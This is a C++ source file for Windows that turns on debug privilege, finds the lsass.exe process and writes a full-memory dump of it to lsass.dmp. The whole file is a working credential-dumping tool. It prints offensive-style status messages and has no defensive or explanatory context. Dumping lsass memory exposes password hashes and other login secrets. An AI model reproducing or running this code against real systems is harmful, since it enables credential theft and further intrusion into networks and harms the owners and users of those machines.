//#include "stdafx.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <stdio.h>
// #pragma comment(lib, "cmcfg32.lib")
#pragma comment (lib, "Dbghelp.lib")

using namespace std;

BOOL SetPrivilege(
)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    cout << "sedebugpriviledge\n";
    
    if (!OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,   
        &hToken))       
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    LPCTSTR lpszPrivilege = SE_DEBUG_NAME;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    BOOL bEnablePrivilege = TRUE;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}

int main() {
        DWORD lsassPID = 0;
        HANDLE lsassHandle = NULL;

        if (!SetPrivilege()) {
            cout << "sedebug error, please use administrator priviledge" << endl;
            return 0;
        }

        // Open a handle to lsass.dmp - this is where the minidump file will be saved to
        HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        // Find lsass PID
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        LPCWSTR processName = L"";

        if (Process32First(snapshot, &processEntry)) {
                while (_wcsicmp(processName, L"lsass.exe") != 0) {
                        Process32Next(snapshot, &processEntry);
                        processName = processEntry.szExeFile;
                        lsassPID = processEntry.th32ProcessID;
                }
                wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
        }

    

        // Open handle to lsass.exe process
        //lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
    lsassHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE  | THREAD_ALL_ACCESS, 0, lsassPID);
        //cout << lsassHandle;
        cout << GetLastError() << endl;

        // Create minidump
        BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        cout << GetLastError() << endl;
        if (isDumped) {
                cout << "[+] lsass dumped successfully!" << endl;
        }

        return 0;
}
